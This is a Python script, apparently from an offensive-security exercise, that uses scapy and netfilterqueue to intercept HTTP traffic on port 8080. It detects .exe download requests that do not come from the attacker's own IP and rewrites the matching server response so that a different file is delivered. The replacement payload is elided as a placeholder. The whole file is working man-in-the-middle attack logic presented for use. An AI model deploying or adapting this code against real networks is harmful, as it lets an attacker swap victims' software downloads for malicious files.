import scapy.all as scapy
import netfilterqueue

# List to store TCP ACK numbers
ack_list = []

# Function to modify packet payload
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Function to process packets in the queue
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the destination port is 8080
        if scapy_packet[scapy.TCP].dport == 8080:
            # Check if the packet payload contains ".exe" and source IP is not the attacker's IP
            if b".exe" in scapy_packet[scapy.Raw].load and b"172.16.56.128" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # Add the TCP ACK number to the list
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # Check if the source port is 8080
        elif scapy_packet[scapy.TCP].sport == 8080:
            # Check if the TCP sequence number is in the ACK list
            if scapy_packet[scapy.TCP].seq in ack_list:
                # Remove the TCP sequence number from the ACK list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # Modify the packet payload
                modified_packet = set_load(scapy_packet, "HTTP......")

                # Set the payload of the original packet to the modified packet
                packet.set_payload(str(modified_packet))

    # Accept the modified packet
    packet.accept()

# Create a netfilter queue object
queue = netfilterqueue.NetfilterQueue()
# Bind the queue to the specified queue number and process_packet function
queue.bind(0, process_packet)
# Run the queue
queue.run()

